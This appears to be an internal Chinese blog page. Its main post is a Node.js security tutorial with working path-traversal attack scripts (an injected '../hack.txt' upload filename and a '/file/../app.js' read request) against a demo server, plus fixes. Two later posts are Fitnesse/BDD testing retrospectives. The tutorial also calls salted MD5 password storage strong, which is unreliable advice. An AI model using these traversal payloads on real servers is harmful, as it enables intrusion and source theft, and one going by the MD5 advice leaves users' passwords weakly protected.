+<p>var http = require(&#8216;http&#8217;);<br />
+var fs = require(&#8216;fs&#8217;);<br />
+var upLoadPage = fs.readFileSync(__dirname+&#8217;/upload.html&#8217;);<br />
+//读取页面到内存，不用每次请求都去做i/o<br />
+http.createServer(function (req, res) {<br />
+res.writeHead(200, {&#8216;Content-Type&#8217;: &#8216;text/html&#8217;});//响应头设置html<br />
+if(req.url === &#8216;/&#8217; &amp;&amp; req.method === &#8216;GET&#8217;){//请求根目录，获取上传文件页面<br />
+return res.end(upLoadPage);<br />
+}<br />
+if(req.url === &#8216;/list&#8217; &amp;&amp; req.method === &#8216;GET&#8217;){//列表展现用户上传的文件<br />
+fs.readdir(__dirname+&#8217;/file&#8217;, function(err,array){<br />
+if(err) return res.end(&#8216;err&#8217;);<br />
+var htmlStr=&#8221;;<br />
+array.forEach(function(v){<br />
+htmlStr += &#8216;<a href="/file/'+v+'" target="_blank">&#8216;+v+&#8217;</a></p>
+<p>&#8216;<br />
+});<br />
+res.end(htmlStr);<br />
+})<br />
+return;<br />
+}<br />
+if(req.url === &#8216;/upload&#8217; &amp;&amp; req.method === &#8216;POST&#8217;){//获取用上传代码，稍后完善<br />
+return;<br />
+}<br />
+if(req.url === &#8216;/file&#8217; &amp;&amp; req.method === &#8216;GET&#8217;){//可以直接下载用户分享的文件，稍后完善<br />
+return;<br />
+}<br />
+res.end(&#8216;Hello World\n&#8217;);<br />
+}).listen(8124);<br />
+我们启动了一个web服务器监听8124端口，然后写了4个路由配置，分别是：</p>
+<p>（1）输出upload.html静态页面；</p>
+<p>（2）展现所有用户上传文件列表的页面；</p>
+<p>（3）接受用户上传文件功能；</p>
+<p>（4）单独输出某一个分享文件详细内容的功能，这里出于简单我们只分享文字。</p>
+<p>upload.html文件代码如下，它是一个具有的form表单上传文件功能的静态页面：</p>
+<h1>网络分享平台</h1>
+<form action="/upload" enctype="multipart/form-data" method="post">选择文件：</p>
+<p><button type="submit">完成提交</button></p>
+</form>
+<p>接下来我们就需要完成整个分享功能的核心部分，接收用户上传的文件然后保存在/file文件夹下，这里我们暂时不考虑用户上传文件重名的问题。我们利用formidable包来处理文件上传的协议细节，所以我们先执行npm install formidable命令安装它，下面是处理用户文件上传的相关代码：</p>
+<p>&#8230;</p>
+<p>var formidable = require(&#8216;formidable&#8217;);</p>
+<p>http.createServer(function (req, res) {</p>
+<p>&#8230;</p>
+<p>if(req.url === &#8216;/upload&#8217; &amp;&amp; req.method === &#8216;POST&#8217;){//获取用上传代码<br />
+var form = new formidable.IncomingForm();<br />
+form.parse(req, function(err, fields, files) {<br />
+res.writeHead(200, {&#8216;content-type&#8217;: &#8216;text/plain&#8217;});<br />
+var filePath = files.myfile.path;//获得临时文件存放地址<br />
+var fileName = files.myfile.name;//原始文件名<br />
+var savePath = __dirname+&#8217;/file/&#8217;;//文件保存路径<br />
+fs.createReadStream(filePath).pipe(fs.createWriteStream(savePath+fileName));<br />
+//将文件拷贝到file目录下<br />
+fs.unlink(filePath);//删除临时文件<br />
+res.end(&#8216;success&#8217;);<br />
+});<br />
+return;<br />
+}</p>
+<p>&#8230;</p>
+<p>}).listen(8124);<br />
+通过formidable包接收用户上传请求之后，我们可以获取到files对象，它包括了name文件名，path临时文件路径等属性，打印如下：</p>
+<p>{ myfile:<br />
+{ domain: null,<br />
+size: 4,<br />
+path: &#8216;C:\\Users\\snoopy\\AppData\\Local\\Temp\\a45cc822df0553a9080cb3bfa1645fd7&#8242;,<br />
+name: &#8217;111.txt&#8217;,<br />
+type: &#8216;text/plain&#8217;,<br />
+hash: null,<br />
+lastModifiedDate: null,<br />
+}<br />
+}<br />
+我们完善了/upload路径下的代码，利用formidable包很容易就获取了用户上传的文件，然后我们把它拷贝到/file文件夹下，并重命名它，最后删除临时文件。</p>
+<p>我们打开浏览器，访问127.0.0.1:8124上传文件，然后访问127.0.0.1:8124/list，通过下面的图片可以看到文件已经上传成功了。</p>
+<p>可能细心的读者已经发现这个上传功能似乎存在问题，现在我们开始构建攻击脚本，打算将hack.txt木马挂载到网站的根目录中，因为我们规定用户上传的文件必须在/file文件夹下，所以如果我们将文件上传至网站根目录，可以算是一次成功的挂马攻击了。</p>
+<p>我们将模拟浏览器发送一个上传文件的请求，构建恶意脚本如下：</p>
+<p>var http = require(&#8216;http&#8217;);<br />
+var fs = require(&#8216;fs&#8217;);<br />
+var options = {<br />
+hostname: &#8217;127.0.0.1&#8242;,<br />
+port: 8124,<br />
+path: &#8216;/upload&#8217;,<br />
+method: &#8216;POST&#8217;<br />
+};<br />
+var request = http.request(options, function(res) {});<br />
+var boundaryKey = Math.random().toString(16); //随机分割字符串<br />
+request.setHeader(&#8216;Content-Type&#8217;, &#8216;multipart/form-data; boundary=&#8221;&#8216;+boundaryKey+&#8217;&#8221;&#8216;);<br />
+//设置请求头，这里需要设置上面生成的分割符<br />
+request.write(<br />
+&#8216;&#8211;&#8217; + boundaryKey + &#8216;\r\n&#8217;<br />
+//在这边输入你的mime文件类型<br />
++ &#8216;Content-Type: application/octet-stream\r\n&#8217;<br />
+//&#8221;name&#8221;input框的name<br />
+//&#8221;filename&#8221;文件名称，这里就是上传文件漏洞的攻击点<br />
++ &#8216;Content-Disposition: form-data; name=&#8221;myfile&#8221;; filename=&#8221;../hack.txt&#8221;\r\n&#8217; //注入恶意文件名<br />
++ &#8216;Content-Transfer-Encoding: binary\r\n\r\n&#8217;<br />
+);<br />
+fs.createReadStream(&#8216;./222.txt&#8217;, { bufferSize: 4 * 1024 })<br />
+.on(&#8216;end&#8217;, function() {<br />
+//加入最后的分隔符<br />
+request.end(&#8216;\r\n&#8211;&#8217; + boundaryKey + &#8216;&#8211;&#8217;);<br />
+}).pipe(request) //管道发送文件内容<br />
+我们在启动恶意脚本之前，使用dir命令查看目前网站根目录下的文件列表：</p>
+<p>2013/11/26 15:04 .<br />
+2013/11/26 15:04 ..<br />
+2013/11/26 13:13 1,409 app.js<br />
+2013/11/26 13:53 file<br />
+2013/11/26 15:04 hack<br />
+2013/11/26 13:44 node_modules<br />
+2013/11/26 11:04 368 upload.html<br />
+app.js是我们之前的服务器文件，hack文件夹存放的就是恶意脚本，下面是执行恶意脚本之后的文件列表</p>
+<p>2013/11/26 15:09 .<br />
+2013/11/26 15:09 ..<br />
+2013/11/26 13:13 1,409 app.js<br />
+2013/11/26 13:53 file<br />
+2013/11/26 15:04 hack<br />
+2013/11/26 15:09 12 hack.txt<br />
+2013/11/26 13:44 node_modules<br />
+2013/11/26 11:04 368 upload.html<br />
+我们看到多了一个hack.txt文件，这说明我们成功的向网站根目录上传了一份恶意文件，如果我们直接覆盖upload.html文件，甚至可以修改掉网站的首页，所以此类漏洞危害非常之大。我们关注受攻击点的代码：</p>
+<p>fs.createReadStream(filePath).pipe(fs.createWriteStream(savePath+fileName));<br />
+我们草率的把文件名和保存路径直接拼接，这是非常有风险的，幸好Node.js提供给我们一个很好的函数来过滤掉此类漏洞。我们把代码修改成下面那样，恶意脚本就无法直接向网站根目录上传文件了。</p>
+<p>fs.createReadStream(filePath).pipe(fs.createWriteStream(savePath + path.basename(fileName)));<br />
+通过path.basename我们就能直接获取文件名，这样恶意脚本就无法再利用相对路径../进行攻击。</p>
+<p>?文件浏览漏洞<br />
+用户上传分享完文件，我们可以通过访问/list来查看所有文件的分享列表，通过点击的<a>标签查看此文件的详细内容，下面我们把显示文件详细内容的代码补上。</a></p>
+<p>&#8230;</p>
+<p>http.createServer(function (req, res) {</p>
+<p>&#8230;</p>
+<p>if(req.url.indexOf(&#8216;/file&#8217;) === 0 &amp;&amp; req.method === &#8216;GET&#8217;){//可以直接下载用户分享的文件<br />
+var filePath = __dirname + req.url; //根据用户请求的路径查找文件<br />
+fs.exists(filePath, function(exists){<br />
+if(!exists) return res.end(&#8216;not found file&#8217;); //如果没有找到文件，则返回错误<br />
+fs.createReadStream(filePath).pipe(res); //否则返回文件内容<br />
+})<br />
+return;<br />
+}</p>
+<p>&#8230;</p>
+<p>}).listen(8124);<br />
+聪明的读者应该已经看出其中代码的问题了，如果我们构建恶意访问地址:</p>
+<p>http://127.0.0.1:8124/file/../app.js</p>
+<p>这样是不是就将我们启动服务器的脚本文件app.js直接输出给客户端了呢？下面是恶意脚本代码：</p>
+<p>var http = require(&#8216;http&#8217;);<br />
+var options = {<br />
+hostname: &#8217;127.0.0.1&#8242;,<br />
+port: 8124,<br />
+path: &#8216;/file/../app.js&#8217;,<br />
+method: &#8216;GET&#8217;<br />
+};<br />
+var request = http.request(options, function(res) {<br />
+res.setEncoding(&#8216;utf8&#8242;);<br />
+res.on(&#8216;readable&#8217;, function () {<br />
+console.log(res.read())<br />
+});<br />
+});<br />
+request.end();<br />
+在Node.js的0.10.x版本新增了stream的`readable事件，然后可直接调用res.read()读取内容，无须像以前那样先监听date事件进行拼接，再监听end事件获取内容了。</p>
+<p>恶意代码请求了/file/../app.js路径，把我们整个app.js文件打印了出来。造成我们恶意脚本攻击成功必然是如下代码：</p>
+<p>var filePath = __dirname + req.url;<br />
+相信有了之前的解决方案，这边读者自行也可以轻松搞定。</p>
+<p>?加密安全<br />
+我们在做web开发时会用到各种各样的加密解密，传统的加解密大致可以分为三种:</p>
+<p>（1）对称加密，使用单密钥加密的算法，即加密方和解密方都使用相同的加密算法和密钥，所以密钥的保存非常关键，因为算法是公开的，而密钥是保密的，常见的对称加密算法有：AES、DES等。</p>
+<p>（2）非对称加密，使用不同的密钥来进行加解密，密钥被分为公钥和私钥，用私钥加密的数据必须使用公钥来解密，同样用公钥加密的数据必须用对应的私钥来解密，常见的非对称加密算法有：RSA等。</p>
+<p>（3）不可逆加密，利用哈希算法使数据加密之后无法解密回原数据，这样的哈希算法常用的有：md5、SHA-1等。</p>
+<p>我们在开发过程中可以使用Node.js的Crypto模块来进行相关的操作。</p>
+<p>?md5存储密码<br />
+在开发网站用户系统的时候，我们都会面临用户的密码如何存储的问题，明文存储当然是不行的，之前有很多历史教训告诉我们，明文存储，一旦数据库被攻破，用户资料将会全部展现给攻击者，给我们带来巨大的损失。</p>
+<p>目前比较流行的做法是对用户注册时的密码进行md5加密存储，下次用户登录的时候，用同样的算法生成md5字符串和数据库原有的md5字符串进行比对，从而判断密码正确与否。</p>
+<p>这样做的好处不言而喻，一旦数据泄漏，恶意用户也是无法直接获取用户密码的，因为md5加密是不可逆的。</p>
+<p>但是md5加密有一个特点，同样的一个字符串经过md5哈希计算之后总是会生成相同的加密字符串，所以攻击者可以利用强大的md5彩虹表来逆推加密前的原始字符串，下面我们来看个例子：</p>
+<p>var crypto = require(&#8216;crypto&#8217;);<br />
+var md5 = function (str, encoding){<br />
+return crypto<br />
+.createHash(&#8216;md5&#8242;)<br />
+.update(str)<br />
+.digest(encoding || &#8216;hex&#8217;);<br />
+};<br />
+var password = &#8216;nodejs&#8217;;<br />
+console.log(md5(password));<br />
+上面代码我们对字符串nodejs进行了md5加密存储，打印的加密字符串如下：</p>
+<p>671a0da0ba061c98de801409dbc57d7e<br />
+我们通过谷歌搜索md5解密关键字，进入一个在线md5破解的网站，输入刚才的加密字符串进行破解：</p>
+<p>我们发现虽然md5加密不可逆，但还是被破解出来了。于是我们改良算法，为所有用户密码存储加上统一的salt值，而不是直接的进行md5加密：</p>
+<p>var crypto = require(&#8216;crypto&#8217;);<br />
+var md5 = function (str, encoding){<br />
+return crypto<br />
+.createHash(&#8216;md5&#8242;)<br />
+.update(str)<br />
+.update(&#8216;abc&#8217;) //这边加入固定的salt值用来加密<br />
+.digest(encoding || &#8216;hex&#8217;);<br />
+};<br />
+var password = &#8216;nodejs&#8217;;<br />
+console.log(md5(password));<br />
+这次我们对用户密码增加salt值abc进行加密，我们还是把生成的加密字符串放入破解网站进行破解：</p>
+<p>网站提示我们要交费才能查看结果，但是密码还是被它破解出来了，看来一些统一的简单的salt值是无法满足加密需求的。</p>
+<p>所以比较好的保存用户密码的方式应该是在user表增加一个salt字段，每次用户注册都要去随机生成一个位数够长的salt字符串，然后再根据这个salt值加密密码，相关流程代码如下：</p>
+<p>var crypto = require(&#8216;crypto&#8217;);<br />
+var md5 = function (str, encoding){<br />
+return crypto<br />
+.createHash(&#8216;md5&#8242;)<br />
+.update(str)<br />
+.digest(encoding || &#8216;hex&#8217;);<br />
+};<br />
+var gap = &#8216;-&#8217;;<br />
+var password = &#8216;nodejs&#8217;;<br />
+var salt = md5(Date.now().toString());<br />
+var md5Password = md5(salt+gap+password);<br />
+console.log(md5Password);<br />
+//0199c7e47cb9b55adac21ebc697673f4<br />
+这样我们生成的加密密码是足够强壮的，就算攻击者拿到了我们数据库，由于他没有我们的代码，不知道我们的加密规则所以也就很难破解用户的真实密码，而且每个用户的密码加密salt值都不同，对破解也带来不少难度。</p>
+<p>?小结<br />
+web安全是我们必须关注且无法逃避的话题，本章介绍了各种常见的web攻击技巧和应对方案，特别是针对Node.js这门新兴起的语言，安全更为重要。我们建议每一位站长在把Node.js部署到生产环境时，将Node.js应用放置在Nginx等web服务器后方，毕竟Node.js还很年轻，需要有一位老大哥将还处于儿童期的Node.js保护好，而不是让它直接面临互联网的各种威胁。</p>
+<p>对于例如SQL，XSS等注入式攻击，我们一定要对用户输入的内容进行严格的过滤和审查，这样可以避免绝大多数的注入式攻击方式，对于DoS攻击我们就需要使用各种工具和配置来减轻危害，另外容易被DDoS（Distributed Denial of Service 分布式拒绝服务）攻击的还有HTTPS服务，在一般不配备SSL加速卡的服务器上，HTTP和HTTPS处理性能上要相差几十甚至上百倍。</p>
+<p>最后我们必须做好严密的系统监控，一旦发现系统有异常情况，必须马上能做出合理的响应措施。</p>
+<p>?参考文献<br />
+?http://www.unclejoey.com/2010/12/28/http-post%E6%85%A2%E9%80%9Fdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%8E%A2/ HTTP POST慢速DOS攻击<br />
+?http://www.darkreading.com/galleries/security/application-security/228400167/slide-show-ddos-with-the-slow-http-post-attack.html slow http post attack<br />
+?http://book.douban.com/subject/10546925/ 白帽子讲Web安全<br />
+?http://blog.nodejs.org/2013/10/22/cve-2013-4450-http-server-pipeline-flood-dos/ DoS Vulnerability<br />
+?https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet XSS Filter Evasion Cheat Sheet<br />
+?http://msdn.microsoft.com/zh-cn/magazine/ff646973.aspx 正则表达式拒绝服务攻击和防御<br />
+?http://drops.wooyun.org/tips/689 XSS与字符编码的那些事儿</p>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=312" title="14:47" rel="bookmark"><time class="entry-date" datetime="2014-01-20T14:47:56+00:00">2014/01/20</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 中的全部文章" rel="category">未分类</a> 分类。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=13" title="查看所有由 chen.hua6 发布的文章" rel="author">chen.hua6</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=16" title="由 cheng.haiming 发布" rel="author">cheng.haiming</a>				
+	<article id="post-307" class="post-307 post type-post status-publish format-standard hentry category-fitnesse category-story category-17 category-16 tag-fitnesse tag-story tag-17">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=307" title="链向 【实例化需求说明】首单回顾 会议纪要 的固定链接" rel="bookmark">【实例化需求说明】首单回顾 会议纪要</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=307#respond" title="《【实例化需求说明】首单回顾 会议纪要》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p><strong>时间： </strong>2014-01-03 14:00 &#8212; 16:00</p>
+<p><strong>会议主题：</strong> 实例化需求说明首单代码实现回顾</p>
+<p><strong>会议主要内容：</strong></p>
+<p><strong>问题 1：</strong>针对节点状态变化趋势判断方法的单元测试实现大家产生异议，当前单元测试用例的数据场景准备是通过测试代码中自己插入数据的方式来实现的，</p>
+<p>大家认为这种方式效率不高，并且依赖太多，测试准备太复杂</p>
+<p><strong>讨论过程：</strong>大家产生了两种方向，一、按照现在的方式 二、使用测试桩（stub）</p>
+<p><strong>结论：</strong>由单元测试代码编写者自己选择方式，暂时不考虑统一，后续过程中对比，发现明显优劣时再统一</p>
+<p><strong>问题 2：</strong>针对业务层的fitnesse 测试，大家发现数据场景的准备全部是在测试代码中实现的，如果测试数据的准备由测试代码来实现这就和ztp的ctu 实现方式类似，如果</p>
+<p>业务数据模型改变了，比如业务模型中增加了一个非空字段，会导致大量的测试用例失败，很多测试用例代码都需要修改。</p>
+<p><strong>讨论过程：</strong>这种情况确实存在，虽然可以通过抽象数据准备曾的测试代码，提取出公共方法并且加以规范控制可以稍微的解决，但是还是存在此问题。</p>
+<p>如果业务方法中能够直接提供数据场景准备的服务集合，就容易处理了，一旦出现业务逻辑的变化导致的数据库模型的变化，那么势必业务层的数据准备服务也会同步修改，</p>
+<p>测试代码中还是直接调用即可。但当前zcip 中很多数据准备服务要不是没有统一的接口，要不就是写的非常凌乱，想实现可用的数据准备条件不容易，zcip 待为测试需优化。</p>
+<p><strong>结论：</strong>一、数据场景准备的应该是测试代码中调用业务代码侧的服务来实现，二、对业务代码的可测性提高要求，在设计时需考虑测试需要</p>
+<p><strong>问题 3：</strong>针对问题 2，如果测试代码调用业务代码来准备数据场景，那么可能会推迟测试代码的开发</p>
+<p><strong>讨论过程：</strong>大家觉得，如果是这样，虽然可以先通过定义测试接口的方式来实现业务代码的开发，有可能出现在开发完成了某些接口后，测试代码才能进行全量的调试，如果有问题，往返的</p>
+<p>成本会高于初期发现问题的成本。</p>
+<p><strong>结论：</strong>定义详细的服务接口，测试代码中先虚拟的调用接口，返回可用值（如测试桩），待服务接口完成后再进行替换。</p>
+<p><strong>问题 4：</strong>这种测试的方式相比ztp 自动化测试没有什么新奇的地方，都是 数据场景准备&#8211;调用业务方法&#8211;验证结果&#8211;数据清理</p>
+<p><strong>讨论过程：</strong>测试方式方法没有什么创新，但对比UI层次的自动化，测试过程与开发同时进行，同时回归的效率也高于UI</p>
+<p><strong>结论：</strong>既然能有效率和稳定性的提升，继续尝试。</p>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=307" title="16:42" rel="bookmark"><time class="entry-date" datetime="2014-01-14T16:42:31+00:00">2014/01/14</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=12" title="查看 fitnesse 中的全部文章" rel="category">fitnesse</a>、<a href="http://10.45.19.178/wordpress/?cat=14" title="查看 story 中的全部文章" rel="category">story</a>、<a href="http://10.45.19.178/wordpress/?cat=17" title="查看 技术回顾 中的全部文章" rel="category">技术回顾</a>、<a href="http://10.45.19.178/wordpress/?cat=16" title="查看 技术讨论 中的全部文章" rel="category">技术讨论</a> 分类，被贴了 <a href="http://10.45.19.178/wordpress/?tag=fitnesse" rel="tag">fitnesse</a>、<a href="http://10.45.19.178/wordpress/?tag=story" rel="tag">story</a>、<a href="http://10.45.19.178/wordpress/?tag=%e6%8a%80%e6%9c%af%e5%9b%9e%e9%a1%be" rel="tag">技术回顾</a> 标签。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=16" title="查看所有由 cheng.haiming 发布的文章" rel="author">cheng.haiming</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=16" title="由 cheng.haiming 发布" rel="author">cheng.haiming</a>				
+	<article id="post-279" class="post-279 post type-post status-publish format-standard hentry category-fitnesse category-story category-17 category-16 tag-fitnesse tag-story tag-13 tag-15">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=279" title="链向 实例化需求首单回顾 的固定链接" rel="bookmark">实例化需求首单回顾</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=279#comments" title="《实例化需求首单回顾》上的评论">3 条回复</a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<h1>1? 目的</h1>
+<p>为推进测试分层的理念，尝试实例化需求和BDD研发模式，在ZCIP系统中选择了一个准备实现实现的需求，由Story编写人员和Test Coder、Developer一起进行了首次落地的试验，并整理过程纪录，为后续工作提供指导。</p>
+<h1>2? 准备工作</h1>
+<p>BDD工具选用Fitnesse，需要搭建Fitnesse服务器。</p>
+<p>开发工具选用Eclipse，自备。</p>
+<p>ZCIP环境直接使用ZCIP项目的环境。</p>
+<h1>3? 任务背景</h1>
+<h2>3.1???? ZCIP</h2>
+<p>&nbsp;</p>
+<p>ZCIP是自建的持续集成和持续发布平台。</p>
+<p>&nbsp;</p>
+<h2>3.2???? 需求背景</h2>
+<p>&nbsp;</p>
+<p>Zmp中任务单见链接：<a href="http://10.45.7.112/ZMP/queryTransDtl.action?transid=506664">http://10.45.7.112/ZMP/queryTransDtl.action?transid=506664</a></p>
+<p>需求提出人是刘伯英。</p>
+<p>在此单完成前，Zcip的流程运行结果邮件是只包括运行时间和流程名，如下图</p>
+<p><a href="http://10.45.19.178/wordpress/wp-content/uploads/2014/01/zcipMailSubject.png"><img class="alignnone size-medium wp-image-280" alt="zcipMailSubject" src="http://10.45.19.178/wordpress/wp-content/uploads/2014/01/zcipMailSubject-300x10.png" width="591" height="27" /></a></p>
+<p>上述结果使收件人需要打开邮件看内容才能了解运行情况，在构建无异常时是一种浪费，所以需求中要求在标题中直接简要地说明流程运行结果。需求细节参看任务单描述和story描述。</p>
+<p>Story见链接：</p>
+<p><a href="http://10.45.5.142:8009/ZcipServer.ZcipServer4Test.MailTest.MailTitleDisplaySuccessOrFailure">http://10.45.5.142:8009/ZcipServer.ZcipServer4Test.MailTest.MailTitleDisplaySuccessOrFailure</a></p>
+<h2>3.3???? 参与人</h2>
+<p>Story编写：陈红</p>
+<p>测试代码编写：程海明</p>
+<p>开发：程海明</p>
+<p>其他：陈华，顾纪兵</p>
+<h1>4? 过程回顾</h1>
+<h2>4.1???? Round 1，想一个表格搞定</h2>
+<p>使用一个表格搞定觉得太臃肿了，而且有些判断条件不一样，不好表达，放弃。</p>
+<h2>4.2???? Round 2，文字还是数字——如何表示变化</h2>
+<p>表格中表示告警数量的增加或者减少，开始使用文字的描述方式，比如告警增加5个error无变化，但是这样的表示方式表格一多就显得很不清晰，让人很不好理解。经过讨论使用+1、-1的方式来表示告警的增加。+1、-1的具体含义在测试场景的标题上进行描述。</p>
+<h2>4.3???? Round 3，拆出是否包括ZTP</h2>
+<p>由于ztp冒烟测试节点的结果反馈到标题的提示和代码检查的不一样，所以对于ztp节点的测试单独拆表格来表示</p>
+<h2>4.4???? Round 4， 拆出是否首次运行</h2>
+<p>流程首次运行没有上次流程运行的结果做比较，所以判断上都以上次0为结果，单独拆出表格表示是否是首次运行</p>
+<h2>4.5???? Round 5，组合太多，茫然……</h2>
+<p>告警的判断组合太多，不知道是否应该在story的编写中体现。</p>
+<h2>4.6???? Round 6，灵感，将节点告警数判断转入单元测试解决</h2>
+<p>代码检查节点总共有9种，入的结果表有3张，而且每个检查节点的结果表示不太一样，比如cppcheck分告警、error、style，圈复杂度是成功还是失败，还有扇入扇出等，由于需求中明确表示所有的都统称为告警增加或减少，无论是单节点判断还是整个流程的判断，只要有一个告警增加邮件提示就是告警增加，所以这里主要是对告警是否增加的判断，组合很多，但是测试场景并不复杂。在表格中体现就会很多，所以改变了思路，将一些函数细节判断的测试转到单元测试中完成。</p>
+<h2>4.7???? Round 7，拆出本次运行失败</h2>
+<p>流程运行失败的提示需要和上次运行的结果做比较，如果上次成功本次失败邮件标题提示失败，如果上次也是失败的邮件标题提示流程仍然失败，所以用例的判断和本次运行成功的有些区别，多了last time the processes running的判断，所以单独拆出表格</p>
+<h2>4.8???? Round 8，修改表格描述，作为story分支入口</h2>
+<p>用例表格的描述一开始都使用Mail Title Display Success Or Failure，这样很难区分一个表格具体是测试哪些场景，比如流程失败的作为一个表格，成功的再另一个表格。为了能很明显的区分每个表格的具体测试分类，经过讨论使用表格描述来划分，比如Mail Title Display Failure、Mail Title Display Success等。</p>
+<h2>4.9???? Round 9，去掉是否首次运行的判断</h2>
+<p>做出首次运行的用例表格后，发现对于邮件标题的提示和非首次运行的没有根本区别，如何判断告警的增加在单元测试中已经完成了，所以决定去掉是否首次运行的测试场景。</p>
+<h2>4.10 Round 10，表格内中文处理，用例实现过程中优化story的编写</h2>
+<p>表格内的中文分文两部分：</p>
+<p>一、????????????? 表格的列头是中文：fitnesse的处理方式中，针对每一个单元格，会自动的调用“setXXX” 方法，假设列头叫：节点名称，那么fitnesse的反射调用就会去找对应的Fixture类中的“set节点名称” 这个方法，虽然java 支持中文方法的命名，但基于编码规范以及以后的维护性等考虑，java的方法命名中尽量避免使用中文命名。</p>
+<p>为了在列名中使用中文，并且在java的方法中不使用中文命名方法，针对fitnesse进行个性化的定制开发，可以这样实现，针对列头，假设列头内容是“节点名称”，针对列头名称我们增加英文描述，如“NodeName”，并进行区分，在实际列名和描述符之间增加分隔符“|”，最终形成的列名为：“节点名称|NodeName”，fitnesse在解析表格时，获取回调方法时，通过动态的设置，使得实际调用的方法名为：“setNodeName”，按照此思路最终顺利实现。</p>
+<p>另一种思路，可以通过解析中文的java 第三方类库，直接把中文解析为汉语拼音，然后通过动态的设置，使得实际调用的方法中不存在中文，实际调用的方法为：“setJieDianMingCheng”。</p>
+<p>这两种实现方式第一种加大了story编写复杂度，并使得用例不够清晰，第二种使得命名过于口语化，不符合专业规范。一般情况下英文都可以描述清楚。</p>
+<p>二、????????????? 表格的内容中存在中文：针对内容中存在中文，如“ZTP冒烟测试用例失败2个”，在用例实现过程中发现，如果后面的测试应用中需针对失败的用例个数来操作，此种描述无疑会增加代码解析处理的复杂度。同时这种需求描述显得的过于臃肿，无法达到见名知意。</p>
+<p>&nbsp;</p>
+<h2>4.11 Round 11 节点结果状态变化趋势判断方法减少无关功能的依赖</h2>
+<p>第一次设计的判断节点结果状态变化趋势方法的方法为：</p>
+<pre class="wp-code-highlight prettyprint">/**
+     * 0 表示的是 全部通过，1 表示增加，-1 表示减少，2 表示无变化 如果当前流程的节点没有没有全部通过，那么需要查询上一次成功实例的节点实例，然后和当前的进行对比，只要有一项增加就算增加，如果任何一项没有增加
+     * 且有一项及其以上减少，算减少，如果所有的都没有变化算没有变化
+     * 
+     * @param flowInstanceId 流程实例id
+     * @param nodeInstanceId 节点实例id
+     * @param nodeId 节点id
+     * @param dto CINodeResultTableDto 对象
+     * @param flowId 流程id
+     * @return 是否通过
+     * @throws BaseAppException 异常
+     */
+    public int judgeState(int flowInstanceId, int nodeInstanceId, int nodeId, CINodeResultTableDto dto, int flowId)
+        throws BaseAppException {
+        int result = 0;
+        try {
+
+            CIDynamicDto dyDto = queryDtoByDyCondition(flowInstanceId, nodeInstanceId, dto);
+            List&amp;lt;Map&amp;lt;String, Object&amp;gt;&amp;gt; objList = dyDto.listValue;
+            Map&amp;lt;String, Object&amp;gt; objtempList = objList.get(0);
+            int intTemp = 0;
+            for (String strTemp : objtempList.keySet()) {
+                intTemp = intTemp + (Integer) objtempList.get(strTemp);
+            }
+            if (intTemp == 0) {
+                return result;
+            }
+
+            ICIFlowInstance ciflowIns = (ICIFlowInstance) DAOFactory.create(Constants.domain, Constants.CIFLOWINSTANCE,
+                Constants.ORACLETYPE);
+            int flowInstanceIdTemp = ciflowIns.queryFlowInstanceLastId(flowInstanceId, flowId, 2);
+
+            // 成功的 flowInstanceId 如果大于零，表示前面也成功过，否则 如果仅当前一次成功，那么直接作为警告增加处理，是否第一次不需要单独处理
+            if (flowInstanceIdTemp &amp;gt; 0) {
+                ICIFlowNodeInstance ciNodeInsDao = (ICIFlowNodeInstance) DAOFactory.create(Constants.domain,
+                    Constants.CIFLOWNODEINSTANCE, Constants.ORACLETYPE);
+
+                CIFlowNodeInstanceDto nodedtoTmep = ciNodeInsDao.queryDtoByFlowInstanceIdAndNodeId(flowInstanceIdTemp,
+                    nodeId);
+                // 如果是新增的节点直接设置为警告增加
+                if (Utils.isEmpty(nodedtoTmep)) {
+                    result = 1;
+                    return result;
+                }
+                // 减少，如果所有的节点的所有项都没有增加，且存在减少项，才为减少
+                boolean isDe = false;
+                CIDynamicDto dyDto4Last = queryDtoByDyCondition(flowInstanceIdTemp, nodedtoTmep.getNodeInstanceId(),
+                    dto);
+                List&amp;lt;Map&amp;lt;String, Object&amp;gt;&amp;gt; objListLast = dyDto4Last.listValue;
+                Map&amp;lt;String, Object&amp;gt; objtempLast = objListLast.get(0);
+                for (String strTemp : objtempList.keySet()) {
+                    int tempInt = (Integer) objtempList.get(strTemp);
+                    int tempIntLat = (Integer) objtempLast.get(strTemp);
+                    if (tempInt &amp;gt; tempIntLat) {
+                        return 1;
+                    }
+                    if (tempInt &amp;lt; tempIntLat) {
+                        isDe = true;
+                    }
+                }
+                if (isDe) {
+                    result = -1;
+                }
+                else {
+                    result = 2;
+                }
+            }
+            else {
+                return 1;
+            }
+        }
+        catch (Exception e) {
+            ExceptionHandler.publish(&quot;judgeState-001&quot;, e);
+        }
+
+        return result;
+
+    }</pre>
+<p>从上面的代码可以看出，在方法内部，首先要根据流程实例id和节点id查询到节点本次和上一次执行成功的结果记录，其后是进行趋势判断。此方法功能很简单，就是判断节点结果记录的变化趋势；但现在这种设计方式，为了实现这些功能，使得judgeState方法中必须关联数据库操作，关联其他的一系列本不必要的操作。而且此方法的单元测试用例数据准备不易实现，执行效率也及其低下。</p>
